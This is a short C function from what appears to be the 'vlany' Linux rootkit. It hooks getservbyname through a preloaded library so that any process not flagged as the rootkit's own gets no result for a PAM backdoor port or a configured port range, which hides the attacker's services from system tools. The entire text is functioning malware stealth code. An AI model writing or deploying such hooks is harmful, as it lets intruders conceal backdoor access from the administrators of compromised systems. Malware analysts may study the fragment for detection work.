struct servent *getservbyname(const char *name, const char *proto)
{
    #ifdef DEBUG
        printf("[vlany] getservbyname() called\n");
    #endif

    HOOK(old_getservbyname, CGETSERVBYNAME);

    if(!name || owned()) return old_getservbyname(name, proto);

    struct servent *tmp = old_getservbyname(name, proto);
    if(tmp && (ntohs(tmp->s_port) == PAM_PORT || (ntohs(tmp->s_port) < HIGH_PORT && ntohs(tmp->s_port) > LOW_PORT))) return NULL;

    return tmp;
}
